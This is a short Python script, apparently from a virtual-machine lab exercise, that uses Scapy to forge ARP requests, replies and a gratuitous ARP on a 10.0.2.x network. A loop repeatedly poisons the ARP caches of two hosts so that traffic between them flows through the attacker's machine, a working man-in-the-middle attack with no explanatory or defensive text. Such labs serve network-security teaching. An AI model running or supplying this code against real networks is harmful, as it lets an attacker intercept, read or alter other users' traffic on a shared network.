from scapy.all import *
import time

macDict = {"10.0.2.6":"08:00:27:8a:a1:b6", "10.0.2.7":"08:00:27:6a:a9:24","10.0.2.15":"08:00:27:28:52:FC"}

def send_req():
	new_frame = ARP(op="who-has", hwsrc=macDict["10.0.2.15"],pdst="10.0.2.6",psrc="10.0.2.7",hwdst=macDict["10.0.2.6"])
	E = Ether(dst=macDict["10.0.2.6"])
	pkt = E/new_frame
	sendp(pkt)

def send_rep():
	new_frame = ARP(op="is-at", hwsrc=macDict["10.0.2.15"],pdst="10.0.2.6",psrc="10.0.2.7",hwdst=macDict["10.0.2.6"])
	E = Ether(dst=macDict["10.0.2.6"])
	pkt = E/new_frame
	sendp(pkt)

def send_grat():
	new_frame = ARP(hwdst="FF:FF:FF:FF:FF:FF",psrc="10.0.2.15",pdst="10.0.2.15")
	E = Ether(dst="FF:FF:FF:FF:FF:FF")
	pkt = E/new_frame
	sendp(pkt)

def poison_B(): #using arp reply
	new_frame = ARP(op="is-at", hwsrc=macDict["10.0.2.15"],pdst="10.0.2.7",psrc="10.0.2.6",hwdst=macDict["10.0.2.7"])
	E = Ether(dst=macDict["10.0.2.7"])
	pkt = E/new_frame
	sendp(pkt)

while True:
	try:
		send_rep()
		poison_B()
		time.sleep(2)
	except KeyboardInterrupt:
		break


#send_rep()
#poison_B()


	
#send_grat()
#send_rep()
